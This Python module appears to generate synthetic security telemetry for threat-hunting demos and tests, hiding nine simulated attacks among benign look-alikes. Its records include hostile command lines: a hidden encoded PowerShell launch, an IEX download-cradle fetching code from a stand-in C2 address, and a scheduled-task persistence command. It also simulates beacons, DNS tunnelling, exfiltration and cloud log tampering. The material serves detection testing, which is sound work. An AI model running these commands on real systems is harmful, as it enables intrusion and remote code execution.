"""Deterministic synthetic telemetry for demos and tests.

A week of normal activity precedes a hunt day. The hunt day repeats normal activity and hides several
attacks in it, next to benign look-alikes that a good hunt should not report as leads. Addresses come from
the documentation ranges reserved by RFC 5737 and RFC 2544. The countries in ``configs/geo.yaml`` are
invented for the demo.
"""

from __future__ import annotations

import hashlib
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

IMPLANT_SHA256 = hashlib.sha256(b"demo-implant").hexdigest()
C2_IP = "203.0.113.66"
TUNNEL_DOMAIN = "c2-tunnel.example"
OFFICE_IP = "192.0.2.10"
FOREIGN_IP = "203.0.113.99"
SPRAY_IP = "198.51.100.23"
SCANNER_IP = "198.18.0.1"
BACKUP_DEST = "198.18.0.50"
CDN_DEST = "198.18.0.20"

Records = dict[str, list[dict[str, Any]]]

_HOSTS = [f"ws-{n:03d}" for n in range(1, 11)]
_SERVERS = ["srv-file01", "srv-web01"]
_USERS = [f"u{n:03d}" for n in range(1, 13)]
_WORKLOAD = [
    (
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Windows\\System32\\services.exe",
        "svchost.exe -k netsvcs",
    ),
    ("C:\\Windows\\explorer.exe", "C:\\Windows\\System32\\userinit.exe", "explorer.exe"),
    (
        "C:\\Program Files\\Google\\Chrome\\chrome.exe",
        "C:\\Windows\\explorer.exe",
        "chrome.exe --no-startup-window",
    ),
    (
        "C:\\Program Files\\Microsoft Office\\winword.exe",
        "C:\\Windows\\explorer.exe",
        "winword.exe report.docx",
    ),
    (
        "C:\\Program Files\\Microsoft Office\\excel.exe",
        "C:\\Windows\\explorer.exe",
        "excel.exe budget.xlsx",
    ),
    (
        "C:\\Program Files\\Microsoft Office\\outlook.exe",
        "C:\\Windows\\explorer.exe",
        "outlook.exe",
    ),
    (
        "C:\\Windows\\System32\\powershell.exe",
        "C:\\Windows\\explorer.exe",
        "powershell.exe Get-Date",
    ),
]
_DOMAINS = [
    "mail.example.com",
    "cdn.example.net",
    "intranet.example.org",
    "updates.example.com",
    "chat.example.net",
    "docs.example.org",
]
_BASELINE_DESTS = [f"192.0.2.{n}" for n in (101, 102, 103, 104, 105)]
_API_NORMAL = ["DescribeInstances", "ListBuckets", "GetCallerIdentity"]


def _iso(moment: datetime) -> str:
    return moment.strftime("%Y-%m-%dT%H:%M:%SZ")


def simulate(*, start: datetime, seed: int = 7, baseline_days: int = 7) -> Records:
    """Records keyed by source format. ``start`` is midnight UTC of the hunt day."""
    rng = random.Random(seed)  # noqa: S311  (reproducible synthetic data, not security)
    start = start.astimezone(timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
    out: Records = {"sysmon": [], "auth": [], "dns": [], "flow": [], "cloudtrail": []}

    def at(day: datetime, hour: float) -> datetime:
        return day + timedelta(seconds=int(hour * 3600))

    def process(
        when: datetime, host: str, user: str, image: str, parent: str, cmd: str, digest: str = ""
    ) -> None:
        record = {
            "EventID": 1,
            "UtcTime": _iso(when),
            "Computer": host,
            "User": f"CORP\\{user}",
            "Image": image,
            "ParentImage": parent,
            "CommandLine": cmd,
        }
        if digest:
            record["Hash"] = f"SHA256={digest}"
        out["sysmon"].append(record)

    def flow(when: datetime, host: str, dst: str, port: int, sent: int) -> None:
        out["flow"].append(
            {
                "timestamp": _iso(when),
                "src_host": host,
                "src_ip": "10.0.0.5",
                "dst_ip": dst,
                "dst_port": port,
                "bytes_out": sent,
                "proto": "tcp",
            }
        )

    def query(
        when: datetime, host: str, name: str, qtype: str = "A", rcode: str = "NOERROR"
    ) -> None:
        out["dns"].append(
            {"timestamp": _iso(when), "client": host, "query": name, "qtype": qtype, "rcode": rcode}
        )

    def login(
        when: datetime,
        host: str,
        user: str,
        ip: str,
        ok: bool = True,
        logon: str = "2",
        src_host: str = "",
    ) -> None:
        record = {
            "timestamp": _iso(when),
            "host": host,
            "user": user,
            "src_ip": ip,
            "result": "success" if ok else "failure",
            "logon_type": logon,
        }
        if src_host:
            record["src_host"] = src_host
        out["auth"].append(record)

    def cloud(
        when: datetime, api: str, user: str, ip: str, mfa: str | None = None, error: str = ""
    ) -> None:
        record: dict[str, Any] = {
            "eventTime": _iso(when),
            "eventName": api,
            "userIdentity": {"userName": user, "type": "IAMUser"},
            "sourceIPAddress": ip,
            "awsRegion": "us-east-1",
        }
        if user == "root":
            record["userIdentity"] = {"type": "Root"}
        if mfa is not None:
            record["additionalEventData"] = {"MFAUsed": mfa}
        if error:
            record["errorCode"] = error
        out["cloudtrail"].append(record)

    days = [start - timedelta(days=n) for n in range(baseline_days, -1, -1)]
    for day in days:
        for index, host in enumerate(_HOSTS + _SERVERS):
            user = _USERS[index % len(_USERS)]
            for image, parent, cmd in rng.sample(_WORKLOAD, 5):
                process(at(day, rng.uniform(7, 18)), host, user, image, parent, cmd)
            for _ in range(15):
                flow(
                    at(day, rng.uniform(7, 19)),
                    host,
                    rng.choice(_BASELINE_DESTS),
                    443,
                    rng.randint(1_000_000, 3_000_000),
                )
            for _ in range(20):
                query(at(day, rng.uniform(7, 19)), host, rng.choice(_DOMAINS))
        for user in _USERS:
            login(
                at(day, rng.uniform(7.5, 9)),
                _HOSTS[_USERS.index(user) % len(_HOSTS)],
                user,
                OFFICE_IP,
            )
        login(at(day, 10), "srv-file01", "admin.jsmith", OFFICE_IP, logon="3", src_host="ws-002")
        login(at(day, 10.5), "srv-web01", "admin.jsmith", OFFICE_IP, logon="3", src_host="ws-002")
        login(at(day, 9), "vpn-gw", "alice", OFFICE_IP)
        for api in _API_NORMAL:
            cloud(at(day, rng.uniform(9, 17)), api, "svc-ci", "192.0.2.60")
        cloud(at(day, 12), "PutObject", "deploy-bot", "192.0.2.50", mfa="Yes")
        for slot in range(0, 24 * 12):
            flow(
                day + timedelta(seconds=slot * 300 + rng.randint(-2, 2)),
                "bk-01",
                BACKUP_DEST,
                443,
                2048,
            )

    day = start
    # Attack 1: Office document to PowerShell, a download, persistence and a masquerading binary.
    victim = "ws-004"
    process(
        at(day, 8.0),
        victim,
        "u004",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Program Files\\Microsoft Office\\winword.exe",
        "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
    )
    process(
        at(day, 8.01),
        victim,
        "u004",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        f"powershell.exe -c \"IEX (New-Object Net.WebClient).DownloadString('http://{C2_IP}/a') -password hunter2xyz\"",
    )
    process(
        at(day, 8.08),
        victim,
        "u004",
        "C:\\Windows\\System32\\schtasks.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "schtasks /create /tn Updater /tr C:\\Users\\Public\\svch0st.exe /sc minute /mo 5",
    )
    process(
        at(day, 8.1),
        victim,
        "u004",
        "C:\\Users\\Public\\svch0st.exe",
        "C:\\Windows\\System32\\services.exe",
        "svch0st.exe",
        IMPLANT_SHA256,
    )
    # Attack 2: command-and-control beacon.
    for n in range(120):
        flow(
            at(day, 8.0) + timedelta(seconds=n * 60 + rng.randint(-3, 3)),
            victim,
            C2_IP,
            443,
            440 + rng.randint(0, 40),
        )
    # Attack 3: DNS tunnel from the same host.
    alphabet = "abcdefghijklmnopqrstuvwxyz234567"
    for n in range(60):
        label = "".join(rng.choice(alphabet) for _ in range(32))
        query(at(day, 11.0) + timedelta(seconds=n * 30), victim, f"{label}.{TUNNEL_DOMAIN}", "TXT")
    # Attack 4: algorithmically generated domains.
    for n in range(20):
        name = "".join(rng.choice("abcdefghijklmnopqrstuvwxyz") for _ in range(14)) + rng.choice(
            [".com", ".net", ".info"]
        )
        query(at(day, 13.0) + timedelta(seconds=n * 30), "ws-007", name, rcode="NXDOMAIN")
    # Attack 5: password spray with one success.
    for n, user in enumerate(_USERS):
        login(at(day, 3.0) + timedelta(seconds=n * 100), "vpn-gw", user, SPRAY_IP, ok=False)
    login(at(day, 3.42), "vpn-gw", "u005", SPRAY_IP)
    # Attack 6: impossible travel.
    login(at(day, 9.0), "vpn-gw", "alice", OFFICE_IP)
    login(at(day, 10.0), "vpn-gw", "alice", FOREIGN_IP)
    # Attack 7: exfiltration from the file server to the C2 address.
    for n in range(6):
        flow(at(day, 2.0) + timedelta(minutes=n * 5), "srv-file01", C2_IP, 8443, 30_000_000)
    for n in range(4):
        flow(
            at(day, 12) + timedelta(minutes=n * 3),
            "srv-file01",
            rng.choice(_BASELINE_DESTS),
            443,
            2_000_000,
        )
    # Attack 8: lateral movement fan-out from the victim.
    for n, target in enumerate(
        ["srv-file01", "srv-web01", "ws-001", "ws-002", "ws-003", "ws-005", "ws-006"]
    ):
        login(
            at(day, 8.33) + timedelta(minutes=n * 2),
            target,
            "admin.jsmith",
            "10.0.0.5",
            logon="3",
            src_host=victim,
        )
    # Attack 9: cloud abuse.
    cloud(at(day, 14.0), "StopLogging", "deploy-bot", "198.51.100.77", mfa="No")
    cloud(at(day, 14.02), "CreateAccessKey", "deploy-bot", "198.51.100.77", mfa="No")
    for n, api in enumerate(
        [
            "ListUsers",
            "ListRoles",
            "ListBuckets",
            "DescribeInstances",
            "DescribeSecurityGroups",
            "GetAccountAuthorizationDetails",
            "ListPolicies",
            "DescribeVpcs",
            "ListAccessKeys",
        ]
    ):
        cloud(at(day, 14.5) + timedelta(seconds=n * 30), api, "svc-ci", "198.51.100.88")
    cloud(at(day, 15.0), "ConsoleLogin", "root", "198.51.100.9", mfa="No")

    # Benign look-alikes: the allowlisted backup beacon (generated with the normal days above), a scanner,
    # a CDN upload and patching fan-out.
    for n, user in enumerate(_USERS):
        login(at(day, 12.0) + timedelta(seconds=n * 20), "vpn-gw", user, SCANNER_IP, ok=False)
    flow(at(day, 16.0), "build-01", CDN_DEST, 443, 90_000_000)
    process(
        at(day, 16.0),
        "build-01",
        "builder",
        "C:\\Builds\\out\\compiled-tool.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "compiled-tool.exe --self-test",
    )
    for n, target in enumerate(_HOSTS[:8]):
        login(
            at(day, 5.0) + timedelta(minutes=n),
            target,
            "svc-patch",
            "10.0.0.9",
            logon="3",
            src_host="patch-01",
        )

    for records in out.values():
        records.sort(key=lambda r: json.dumps(r, sort_keys=True))
    return out


def write_records(records: Records, directory: Path) -> list[Path]:
    """Write each source's records as ``<source>.jsonl`` in ``directory``."""
    directory.mkdir(parents=True, exist_ok=True)
    paths = []
    for source, items in records.items():
        path = directory / f"{source}.jsonl"
        path.write_text("".join(json.dumps(item) + "\n" for item in items), encoding="utf-8")
        paths.append(path)
    return paths
